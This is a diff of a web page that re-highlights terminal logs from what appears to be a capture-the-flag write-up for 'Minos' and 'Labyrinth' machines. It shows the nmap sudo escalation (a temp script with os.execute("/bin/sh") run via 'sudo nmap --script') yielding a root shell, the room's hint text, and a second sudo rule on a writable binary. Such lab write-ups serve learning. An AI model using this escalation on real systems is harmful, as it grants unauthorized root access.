@@ -122,301 +122,301 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>minos@Minos:~$ sudo -l
-Matching Defaults entries for minos on Minos:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<div class="codehilite"><pre><span></span><code><span class="s s-Atom">minos@</span><span class="nv">Minos</span><span class="o">:~</span><span class="err">$</span> <span class="s s-Atom">sudo</span> <span class="o">-</span><span class="s s-Atom">l</span>
+<span class="nv">Matching</span> <span class="nv">Defaults</span> <span class="s s-Atom">entries</span> <span class="s s-Atom">for</span> <span class="s s-Atom">minos</span> <span class="s s-Atom">on</span> <span class="nv">Minos</span><span class="o">:</span>
+    <span class="s s-Atom">env_reset</span><span class="p">,</span> <span class="s s-Atom">mail_badpass</span><span class="p">,</span>
+    <span class="s s-Atom">secure_path=/usr</span><span class="o">/</span><span class="s s-Atom">local</span><span class="o">/</span><span class="s s-Atom">sbin\:/usr</span><span class="o">/</span><span class="s s-Atom">local</span><span class="o">/</span><span class="s s-Atom">bin\:/usr</span><span class="o">/</span><span class="s s-Atom">sbin\:/usr</span><span class="o">/</span><span class="s s-Atom">bin\:/sbin\:/bin\:/snap</span><span class="o">/</span><span class="s s-Atom">bin</span>
 
-User minos may run the following commands on Minos:
-    (root) NOPASSWD: /usr/bin/nmap
-minos@Minos:~$ TF=$(mktemp)
-minos@Minos:~$ echo 'os.execute(&quot;/bin/sh&quot;)' &gt; $TF
-minos@Minos:~$ sudo nmap --script=$TF
+<span class="nv">User</span> <span class="s s-Atom">minos</span> <span class="s s-Atom">may</span> <span class="s s-Atom">run</span> <span class="s s-Atom">the</span> <span class="s s-Atom">following</span> <span class="s s-Atom">commands</span> <span class="s s-Atom">on</span> <span class="nv">Minos</span><span class="o">:</span>
+    <span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span> <span class="nv">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="s s-Atom">usr</span><span class="o">/</span><span class="s s-Atom">bin</span><span class="o">/</span><span class="s s-Atom">nmap</span>
+<span class="s s-Atom">minos@</span><span class="nv">Minos</span><span class="o">:~</span><span class="err">$</span> <span class="nv">TF</span><span class="s s-Atom">=</span><span class="err">$</span><span class="p">(</span><span class="s s-Atom">mktemp</span><span class="p">)</span>
+<span class="s s-Atom">minos@</span><span class="nv">Minos</span><span class="o">:~</span><span class="err">$</span> <span class="s s-Atom">echo</span> <span class="s s-Atom">&#39;os.execute(&quot;/bin/sh&quot;)&#39;</span> <span class="o">&gt;</span> <span class="err">$</span><span class="nv">TF</span>
+<span class="s s-Atom">minos@</span><span class="nv">Minos</span><span class="o">:~</span><span class="err">$</span> <span class="s s-Atom">sudo</span> <span class="s s-Atom">nmap</span> <span class="s s-Atom">--script=</span><span class="err">$</span><span class="nv">TF</span>
 
-Starting Nmap 7.60 ( https://nmap.org ) at 2026-01-01 00:50 UTC
-NSE: Warning: Loading '/tmp/tmp.UU714afSBE' -- the recommended file extension is '.nse'.
-# uid=0(root) gid=0(root) groups=0(root)
-# /bin/sh: 2: cd: can't cd to root
-# # # # # # # # 
-# Crete_Shores  Minos_Flag
-# Crete_Shores  Minos_Flag
-# # # 
-# /bin/sh: 14: cd: can't cd to cd
-# # # # # 
-# 
-# 
-# uid=0(root) gid=0(root) groups=0(root)
-# root
-# # uid=0(root) gid=0(root) groups=0(root)
-# bin  boot  dev        etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
-# # dear_mr_SUID  minotaur
-# /bin/sh: 26: cd: can't cd to minotaur
-# /bin/sh: 27: cd: can't cd to dear_mr_SUID
-# /bin/sh: 28: LS: not found
-# total 13
-drwx------  5 root root   10 Aug 20  2020 .
-drwxr-xr-x 22 root root   22 Aug  3  2020 ..
-lrwxrwxrwx  1 root root    9 Aug  3  2020 .bash_history -&gt; /dev/null
--rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-drwx------  3 root root    4 Aug  3  2020 .cache
-drwx------  3 root root    3 Aug  3  2020 .gnupg
--rw-r--r--  1 root root  148 Aug 17  2015 .profile
-drwx------  2 root root    4 Aug  3  2020 .ssh
--rw-r--r--  1 root root 2866 Aug  4  2020 dear_mr_SUID
--rw-r--r--  1 root root  912 Aug  4  2020 minotaur
-# 
-       -&quot;&quot;\
-    .-&quot;  .`)     (
-   j   .'_+     :[                )      .^--..
-  i    -&quot;       |l                ].    /      i
- ,&quot; .:j         `8o  _,,+.,.--,   d|   `:::;    b
- i  :'|          &quot;88p;.  (-.&quot;_&quot;-.oP        \.   :
- ; .  (            &gt;,%%%   f),):8&quot;          \:'  i
-i  :: j          ,;%%%:; ; ; i:%%%.,        i.   `.
-i  `: ( ____  ,-::::::' ::j  [:```          [8:   )
-&lt;  ..``'::::8888oooooo.  :(jj(,;,,,         [8::  &lt;
-`. ``:.      oo.8888888888:;%%%8o.::.+888+o.:`:'  |
- `.   `        `o`88888888b`%%%%%88&lt; Y888P&quot;&quot;'-    ;
-   &quot;`---`.       Y`888888888;;.,&quot;888b.&quot;&quot;&quot;..::::'-'
-          &quot;-....  b`8888888:::::.`8888._::-&quot;
-             `:::. `:::::O:::::::.`%%'|
-              `.      &quot;``::::::''    .'
-                `.                   &lt;
-                  +:         `:   -';
-                   `:         : .::/
-                    ;+_  :::. :..;;;       
-                    ;;;;,;;;;;;;;,;;
+<span class="nv">Starting</span> <span class="nv">Nmap</span> <span class="mf">7.60</span> <span class="p">(</span> <span class="s s-Atom">https</span><span class="p">:</span><span class="o">//</span><span class="s s-Atom">nmap</span><span class="p">.</span><span class="s s-Atom">org</span> <span class="p">)</span> <span class="s s-Atom">at</span> <span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span> <span class="mi">00</span><span class="o">:</span><span class="mi">50</span> <span class="nv">UTC</span>
+<span class="nv">NSE</span><span class="o">:</span> <span class="nv">Warning</span><span class="o">:</span> <span class="nv">Loading</span> <span class="s s-Atom">&#39;/tmp/tmp.UU714afSBE&#39;</span> <span class="s s-Atom">--</span> <span class="s s-Atom">the</span> <span class="s s-Atom">recommended</span> <span class="s s-Atom">file</span> <span class="s s-Atom">extension</span> <span class="o">is</span> <span class="s s-Atom">&#39;.nse&#39;</span><span class="p">.</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span> <span class="s s-Atom">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span> <span class="s s-Atom">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span>
+<span class="s s-Atom">#</span> <span class="o">/</span><span class="s s-Atom">bin</span><span class="o">/</span><span class="s s-Atom">sh</span><span class="p">:</span> <span class="mi">2</span><span class="o">:</span> <span class="s s-Atom">cd</span><span class="p">:</span> <span class="s s-Atom">can&#39;t cd to root</span>
+<span class="s s-Atom"># # # # # # # # </span>
+<span class="s s-Atom"># Crete_Shores  Minos_Flag</span>
+<span class="s s-Atom"># Crete_Shores  Minos_Flag</span>
+<span class="s s-Atom"># # # </span>
+<span class="s s-Atom"># /bin/sh: 14: cd: can&#39;t</span> <span class="s s-Atom">cd</span> <span class="s s-Atom">to</span> <span class="s s-Atom">cd</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">#</span> <span class="s s-Atom">#</span> <span class="s s-Atom">#</span> <span class="s s-Atom">#</span> 
+<span class="s s-Atom">#</span> 
+<span class="s s-Atom">#</span> 
+<span class="s s-Atom">#</span> <span class="s s-Atom">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span> <span class="s s-Atom">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span> <span class="s s-Atom">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">root</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">#</span> <span class="s s-Atom">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span> <span class="s s-Atom">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span> <span class="s s-Atom">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="s s-Atom">root</span><span class="p">)</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">bin</span>  <span class="s s-Atom">boot</span>  <span class="s s-Atom">dev</span>        <span class="s s-Atom">etc</span>  <span class="s s-Atom">home</span>  <span class="s s-Atom">lib</span>  <span class="s s-Atom">lib64</span>  <span class="s s-Atom">media</span>  <span class="s s-Atom">mnt</span>  <span class="s s-Atom">opt</span>  <span class="s s-Atom">proc</span>  <span class="s s-Atom">root</span>  <span class="s s-Atom">run</span>  <span class="s s-Atom">sbin</span>  <span class="s s-Atom">snap</span>  <span class="s s-Atom">srv</span>  <span class="s s-Atom">sys</span>  <span class="s s-Atom">tmp</span>  <span class="s s-Atom">usr</span>  <span class="s s-Atom">var</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">#</span> <span class="s s-Atom">dear_mr_SUID</span>  <span class="s s-Atom">minotaur</span>
+<span class="s s-Atom">#</span> <span class="o">/</span><span class="s s-Atom">bin</span><span class="o">/</span><span class="s s-Atom">sh</span><span class="p">:</span> <span class="mi">26</span><span class="o">:</span> <span class="s s-Atom">cd</span><span class="p">:</span> <span class="s s-Atom">can&#39;t cd to minotaur</span>
+<span class="s s-Atom"># /bin/sh: 27: cd: can&#39;t</span> <span class="s s-Atom">cd</span> <span class="s s-Atom">to</span> <span class="s s-Atom">dear_mr_SUID</span>
+<span class="s s-Atom">#</span> <span class="o">/</span><span class="s s-Atom">bin</span><span class="o">/</span><span class="s s-Atom">sh</span><span class="p">:</span> <span class="mi">28</span><span class="o">:</span> <span class="nv">LS</span><span class="o">:</span> <span class="o">not</span> <span class="s s-Atom">found</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">total</span> <span class="mi">13</span>
+<span class="s s-Atom">drwx------</span>  <span class="mi">5</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>   <span class="mi">10</span> <span class="nv">Aug</span> <span class="mi">20</span>  <span class="mi">2020</span> <span class="p">.</span>
+<span class="s s-Atom">drwxr</span><span class="o">-</span><span class="s s-Atom">xr</span><span class="o">-</span><span class="s s-Atom">x</span> <span class="mi">22</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>   <span class="mi">22</span> <span class="nv">Aug</span>  <span class="mi">3</span>  <span class="mi">2020</span> <span class="p">..</span>
+<span class="s s-Atom">lrwxrwxrwx</span>  <span class="mi">1</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>    <span class="mi">9</span> <span class="nv">Aug</span>  <span class="mi">3</span>  <span class="mi">2020</span> <span class="p">.</span><span class="s s-Atom">bash_history</span> <span class="s s-Atom">-&gt;</span> <span class="o">/</span><span class="s s-Atom">dev</span><span class="o">/</span><span class="s s-Atom">null</span>
+<span class="o">-</span><span class="s s-Atom">rw</span><span class="o">-</span><span class="s s-Atom">r--r--</span>  <span class="mi">1</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span> <span class="mi">3106</span> <span class="nv">Apr</span>  <span class="mi">9</span>  <span class="mi">2018</span> <span class="p">.</span><span class="s s-Atom">bashrc</span>
+<span class="s s-Atom">drwx------</span>  <span class="mi">3</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>    <span class="mi">4</span> <span class="nv">Aug</span>  <span class="mi">3</span>  <span class="mi">2020</span> <span class="p">.</span><span class="s s-Atom">cache</span>
+<span class="s s-Atom">drwx------</span>  <span class="mi">3</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>    <span class="mi">3</span> <span class="nv">Aug</span>  <span class="mi">3</span>  <span class="mi">2020</span> <span class="p">.</span><span class="s s-Atom">gnupg</span>
+<span class="o">-</span><span class="s s-Atom">rw</span><span class="o">-</span><span class="s s-Atom">r--r--</span>  <span class="mi">1</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>  <span class="mi">148</span> <span class="nv">Aug</span> <span class="mi">17</span>  <span class="mi">2015</span> <span class="p">.</span><span class="s s-Atom">profile</span>
+<span class="s s-Atom">drwx------</span>  <span class="mi">2</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>    <span class="mi">4</span> <span class="nv">Aug</span>  <span class="mi">3</span>  <span class="mi">2020</span> <span class="p">.</span><span class="s s-Atom">ssh</span>
+<span class="o">-</span><span class="s s-Atom">rw</span><span class="o">-</span><span class="s s-Atom">r--r--</span>  <span class="mi">1</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span> <span class="mi">2866</span> <span class="nv">Aug</span>  <span class="mi">4</span>  <span class="mi">2020</span> <span class="s s-Atom">dear_mr_SUID</span>
+<span class="o">-</span><span class="s s-Atom">rw</span><span class="o">-</span><span class="s s-Atom">r--r--</span>  <span class="mi">1</span> <span class="s s-Atom">root</span> <span class="s s-Atom">root</span>  <span class="mi">912</span> <span class="nv">Aug</span>  <span class="mi">4</span>  <span class="mi">2020</span> <span class="s s-Atom">minotaur</span>
+<span class="s s-Atom">#</span> 
+       <span class="s s-Atom">-</span><span class="s2">&quot;&quot;</span><span class="s s-Atom">\</span>
+    <span class="p">.</span><span class="s s-Atom">-</span><span class="s2">&quot;  .`)     (</span>
+<span class="s2">   j   .&#39;_+     :[                )      .^--..</span>
+<span class="s2">  i    -&quot;</span>       <span class="p">|</span><span class="s s-Atom">l</span>                <span class="p">].</span>    <span class="o">/</span>      <span class="s s-Atom">i</span>
+ <span class="p">,</span><span class="s2">&quot; .:j         `8o  _,,+.,.--,   d|   `:::;    b</span>
+<span class="s2"> i  :&#39;|          &quot;</span><span class="mi">88</span><span class="s s-Atom">p</span><span class="p">;.</span>  <span class="p">(</span><span class="s s-Atom">-.</span><span class="s2">&quot;_&quot;</span><span class="s s-Atom">-.oP</span>        <span class="s s-Atom">\.</span>   <span class="o">:</span>
+ <span class="p">;</span> <span class="p">.</span>  <span class="p">(</span>            <span class="s s-Atom">&gt;</span><span class="p">,</span><span class="c1">%%%   f),):8&quot;          \:&#39;  i</span>
+<span class="s s-Atom">i</span>  <span class="o">::</span> <span class="s s-Atom">j</span>          <span class="p">,;</span><span class="c1">%%%:; ; ; i:%%%.,        i.   `.</span>
+<span class="s s-Atom">i</span>  <span class="err">`</span><span class="o">:</span> <span class="p">(</span> <span class="k">____</span>  <span class="p">,</span><span class="s s-Atom">-::::::&#39; ::j  [:```          [8:   )</span>
+<span class="s s-Atom">&lt;  ..``&#39;</span><span class="o">::::</span><span class="mi">8888</span><span class="s s-Atom">oooooo</span><span class="p">.</span>  <span class="o">:</span><span class="p">(</span><span class="nf">jj</span><span class="p">(,;,,,</span>         <span class="p">[</span><span class="mi">8</span><span class="o">::</span>  <span class="o">&lt;</span>
+<span class="err">`</span><span class="p">.</span> <span class="err">``</span><span class="o">:</span><span class="p">.</span>      <span class="s s-Atom">oo</span><span class="mf">.8888888888</span><span class="o">:</span><span class="p">;</span><span class="c1">%%%8o.::.+888+o.:`:&#39;  |</span>
+ <span class="err">`</span><span class="p">.</span>   <span class="err">`</span>        <span class="err">`</span><span class="s s-Atom">o</span><span class="err">`</span><span class="mi">88888888</span><span class="s s-Atom">b</span><span class="err">`</span><span class="c1">%%%%%88&lt; Y888P&quot;&quot;&#39;-    ;</span>
+   <span class="s2">&quot;`---`.       Y`888888888;;.,&quot;</span><span class="mi">888</span><span class="s s-Atom">b</span><span class="p">.</span><span class="s2">&quot;&quot;&quot;..::::&#39;-&#39;</span>
+<span class="s2">          &quot;</span><span class="s s-Atom">-....</span>  <span class="s s-Atom">b</span><span class="err">`</span><span class="mi">8888888</span><span class="o">:::::</span><span class="p">.</span><span class="err">`</span><span class="mf">8888.</span><span class="k">_</span><span class="o">::</span><span class="s s-Atom">-</span><span class="s2">&quot;</span>
+<span class="s2">             `:::. `:::::O:::::::.`%%&#39;|</span>
+<span class="s2">              `.      &quot;</span><span class="err">``</span><span class="o">::::::</span><span class="s s-Atom">&#39;&#39;</span>    <span class="p">.</span><span class="s s-Atom">&#39;</span>
+<span class="s s-Atom">                `.                   &lt;</span>
+<span class="s s-Atom">                  +:         `:   -&#39;</span><span class="p">;</span>
+                   <span class="err">`</span><span class="o">:</span>         <span class="o">:</span> <span class="p">.</span><span class="o">::/</span>
+                    <span class="p">;</span><span class="s s-Atom">+</span><span class="k">_</span>  <span class="o">:::</span><span class="p">.</span> <span class="o">:</span><span class="p">..;;;</span>       
+                    <span class="p">;;;;,;;;;;;;;,;;</span>
 
-# # /bin/sh: 32cat: not found
-# /bin/sh: 33: CD: not found
-# /bin/sh: 34: ID: not found
-# dear_mr_SUID  minotaur
-#                  _.                              _______
-           __.--'  |             ____...,---'''''     .'''-.
-       _,-'        \ ____...--'''                     | '   '-._
-    ,-'             |                                 |  \      -.
- ,-'                '                                 |   '       `\
-|                    \                               .'    '   _,._/
-|                     \                              |      '  \
-|                     \                              |       \  '
-||                     \                             |        \&lt;
-|\                      \                           |          \|
-|'.                     \                           /           |
-| |                      \                         |            '
-| '.                      |                  ____,..             \
-|  |                       \__,...-----''''''       `.            |
-|  '.                      \                          \           '
-|   |                       \                          `           \
-|   '                        \                          `           |
-|    |                        \                          \          \
-|    '.                       '                           \          \
-|     \                        \                           \       _,|
-|      |                        \                           \ _,.--  |
-|      '.                        ,                       _,.-'       |
-'       \                  _,.-''                 __.,-''            |
- |       |             _.-'                _,.,--'                   |
- \        \        _.-'           __,.,--''                          |
- '        `.    ,-'      __..---''                                   |
- '         \ ,-'___..,--'                                            '
-  \         -'''                                                     |
-   .        |                                                       ,
-    |       |                                                       |
-    '       |                                                       |
-     \      |                                                       |
-      \     |                                                       |
-       \    |                                                 __,.-''
-        \   |                                        __,..-''
-         \  |                              ___..--'''        
-          \ |                     ___,.--''
-           \|        ____...,--'''
-            '_..,--''
+<span class="s s-Atom">#</span> <span class="s s-Atom">#</span> <span class="o">/</span><span class="s s-Atom">bin</span><span class="o">/</span><span class="s s-Atom">sh</span><span class="p">:</span> <span class="mi">32</span><span class="s s-Atom">cat</span><span class="p">:</span> <span class="o">not</span> <span class="s s-Atom">found</span>
+<span class="s s-Atom">#</span> <span class="o">/</span><span class="s s-Atom">bin</span><span class="o">/</span><span class="s s-Atom">sh</span><span class="p">:</span> <span class="mi">33</span><span class="o">:</span> <span class="nv">CD</span><span class="o">:</span> <span class="o">not</span> <span class="s s-Atom">found</span>
+<span class="s s-Atom">#</span> <span class="o">/</span><span class="s s-Atom">bin</span><span class="o">/</span><span class="s s-Atom">sh</span><span class="p">:</span> <span class="mi">34</span><span class="o">:</span> <span class="nv">ID</span><span class="o">:</span> <span class="o">not</span> <span class="s s-Atom">found</span>
+<span class="s s-Atom">#</span> <span class="s s-Atom">dear_mr_SUID</span>  <span class="s s-Atom">minotaur</span>
+<span class="s s-Atom">#</span>                  <span class="k">_</span><span class="p">.</span>                              <span class="k">_______</span>
+           <span class="k">__</span><span class="p">.</span><span class="s s-Atom">--&#39;  |             ____...,---&#39;&#39;&#39;&#39;&#39;</span>     <span class="p">.</span><span class="s s-Atom">&#39;&#39;&#39;-.</span>
+<span class="s s-Atom">       _,-&#39;</span>        <span class="s s-Atom">\</span> <span class="k">____</span><span class="p">...</span><span class="s s-Atom">--&#39;&#39;&#39;                     | &#39;</span>   <span class="s s-Atom">&#39;-._</span>
+<span class="s s-Atom">    ,-&#39;</span>             <span class="p">|</span>                                 <span class="p">|</span>  <span class="s s-Atom">\</span>      <span class="s s-Atom">-.</span>
+ <span class="p">,</span><span class="s s-Atom">-&#39;                &#39;</span>                                 <span class="p">|</span>   <span class="s s-Atom">&#39;       `\</span>
+<span class="s s-Atom">|                    \                               .&#39;</span>    <span class="s s-Atom">&#39;   _,._/</span>
+<span class="s s-Atom">|                     \                              |      &#39;</span>  <span class="s s-Atom">\</span>
+<span class="p">|</span>                     <span class="s s-Atom">\</span>                              <span class="p">|</span>       <span class="s s-Atom">\</span>  <span class="s s-Atom">&#39;</span>
+<span class="s s-Atom">||                     \                             |        \&lt;</span>
+<span class="s s-Atom">|\                      \                           |          \|</span>
+<span class="s s-Atom">|&#39;</span><span class="p">.</span>                     <span class="s s-Atom">\</span>                           <span class="o">/</span>           <span class="p">|</span>
+<span class="p">|</span> <span class="p">|</span>                      <span class="s s-Atom">\</span>                         <span class="p">|</span>            <span class="s s-Atom">&#39;</span>
+<span class="s s-Atom">| &#39;</span><span class="p">.</span>                      <span class="p">|</span>                  <span class="k">____</span><span class="p">,..</span>             <span class="s s-Atom">\</span>
+<span class="p">|</span>  <span class="p">|</span>                       <span class="s s-Atom">\</span><span class="k">__</span><span class="p">,...</span><span class="s s-Atom">-----&#39;&#39;&#39;&#39;&#39;&#39;</span>       <span class="err">`</span><span class="p">.</span>            <span class="p">|</span>
+<span class="p">|</span>  <span class="s s-Atom">&#39;.                      \                          \           &#39;</span>
+<span class="p">|</span>   <span class="p">|</span>                       <span class="s s-Atom">\</span>                          <span class="err">`</span>           <span class="s s-Atom">\</span>
+<span class="p">|</span>   <span class="s s-Atom">&#39;                        \                          `           |</span>
+<span class="s s-Atom">|    |                        \                          \          \</span>
+<span class="s s-Atom">|    &#39;</span><span class="p">.</span>                       <span class="s s-Atom">&#39;                           \          \</span>
+<span class="s s-Atom">|     \                        \                           \       _,|</span>
+<span class="s s-Atom">|      |                        \                           \ _,.--  |</span>
+<span class="s s-Atom">|      &#39;</span><span class="p">.</span>                        <span class="p">,</span>                       <span class="k">_</span><span class="p">,.</span><span class="s s-Atom">-&#39;       |</span>
+<span class="s s-Atom">&#39;</span>       <span class="s s-Atom">\</span>                  <span class="k">_</span><span class="p">,.</span><span class="s s-Atom">-&#39;&#39;</span>                 <span class="k">__</span><span class="p">.,</span><span class="s s-Atom">-&#39;&#39;</span>            <span class="p">|</span>
+ <span class="p">|</span>       <span class="p">|</span>             <span class="k">_</span><span class="p">.</span><span class="s s-Atom">-&#39;                _,.,--&#39;</span>                   <span class="p">|</span>
+ <span class="s s-Atom">\</span>        <span class="s s-Atom">\</span>        <span class="k">_</span><span class="p">.</span><span class="s s-Atom">-&#39;           __,.,--&#39;&#39;                          |</span>
+<span class="s s-Atom"> &#39;</span>        <span class="err">`</span><span class="p">.</span>    <span class="p">,</span><span class="s s-Atom">-&#39;      __..---&#39;&#39;                                   |</span>
+<span class="s s-Atom"> &#39;</span>         <span class="s s-Atom">\</span> <span class="p">,</span><span class="s s-Atom">-&#39;___..,--&#39;</span>                                            <span class="s s-Atom">&#39;</span>
+<span class="s s-Atom">  \         -&#39;&#39;&#39;</span>                                                     <span class="p">|</span>
+   <span class="p">.</span>        <span class="p">|</span>                                                       <span class="p">,</span>
+    <span class="p">|</span>       <span class="p">|</span>                                                       <span class="p">|</span>
+    <span class="s s-Atom">&#39;       |                                                       |</span>
+<span class="s s-Atom">     \      |                                                       |</span>
+<span class="s s-Atom">      \     |                                                       |</span>
+<span class="s s-Atom">       \    |                                                 __,.-&#39;&#39;</span>
+<span class="s s-Atom">        \   |                                        __,..-&#39;&#39;</span>
+<span class="s s-Atom">         \  |                              ___..--&#39;&#39;&#39;</span>        
+          <span class="s s-Atom">\</span> <span class="p">|</span>                     <span class="k">___</span><span class="p">,.</span><span class="s s-Atom">--&#39;&#39;</span>
+           <span class="s s-Atom">\</span><span class="p">|</span>        <span class="k">____</span><span class="p">...,</span><span class="s s-Atom">--&#39;&#39;&#39;</span>
+<span class="s s-Atom">            &#39;</span><span class="k">_</span><span class="p">..,</span><span class="s s-Atom">--&#39;&#39;</span>
 
-Looks like you've exploited the nmap SUID.
+<span class="nv">Looks</span> <span class="s s-Atom">like</span> <span class="s s-Atom">you&#39;ve exploited the nmap SUID.</span>
 
-Here's an empty box for the effort!
+<span class="s s-Atom">Here&#39;s</span> <span class="s s-Atom">an</span> <span class="s s-Atom">empty</span> <span class="s s-Atom">box</span> <span class="s s-Atom">for</span> <span class="s s-Atom">the</span> <span class="s s-Atom">effort</span><span class="p">!</span>
 
-Perhaps checking the network information
-and using the SUID based binary to look 
-for other things to use that information
-on that you should have got earlier.
+<span class="nv">Perhaps</span> <span class="s s-Atom">checking</span> <span class="s s-Atom">the</span> <span class="s s-Atom">network</span> <span class="s s-Atom">information</span>
+<span class="s s-Atom">and</span> <span class="s s-Atom">using</span> <span class="s s-Atom">the</span> <span class="nv">SUID</span> <span class="s s-Atom">based</span> <span class="s s-Atom">binary</span> <span class="s s-Atom">to</span> <span class="s s-Atom">look</span> 
+<span class="s s-Atom">for</span> <span class="s s-Atom">other</span> <span class="s s-Atom">things</span> <span class="s s-Atom">to</span> <span class="s s-Atom">use</span> <span class="s s-Atom">that</span> <span class="s s-Atom">information</span>
+<span class="s s-Atom">on</span> <span class="s s-Atom">that</span> <span class="s s-Atom">you</span> <span class="s s-Atom">should</span> <span class="s s-Atom">have</span> <span class="s s-Atom">got</span> <span class="s s-Atom">earlier</span><span class="p">.</span>
 
-Perhaps reading the story as you progress 
-will help you, Good luck hero!
-</code></pre>
+<span class="nv">Perhaps</span> <span class="s s-Atom">reading</span> <span class="s s-Atom">the</span> <span class="s s-Atom">story</span> <span class="s s-Atom">as</span> <span class="s s-Atom">you</span> <span class="s s-Atom">progress</span> 
+<span class="s s-Atom">will</span> <span class="s s-Atom">help</span> <span class="s s-Atom">you</span><span class="p">,</span> <span class="nv">Good</span> <span class="s s-Atom">luck</span> <span class="s s-Atom">hero</span><span class="p">!</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>entrance@Labyrinth:/home$ sudo -l
-Matching Defaults entries for entrance on Labyrinth:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<div class="codehilite"><pre><span></span><code><span class="n">entrance</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">Labyrinth</span><span class="p">:</span>
+<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span>
+<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
 
-User entrance may run the following commands on Labyrinth:
-    (minotaur) NOPASSWD: /home/entrance/labyrinth
+<span class="k">User</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">Labyrinth</span><span class="p">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">minotaur</span><span class="p">)</span><span class="w"> </span><span class="nl">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span><span class="o">/</span><span class="n">labyrinth</span>
 
-minotaur@Labyrinth:/home/minotaur$ ls -ld /home/entrance
-drwxr-xr-x 5 entrance entrance 13 Jan  1 02:40 /home/entrance
-minotaur@Labyrinth:/home/minotaur$ ls -l /home/entrance/labyrinth
--rwxrwxr-x 1 entrance entrance 22 Jan  1 02:42 /home/entrance/labyrinth
-minotaur@Labyrinth:/home/minotaur$ 
+<span class="n">minotaur</span><span class="nv">@Labyrinth</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">minotaur</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">ld</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="n">entrance</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="n">Jan</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">02</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">entrance</span>
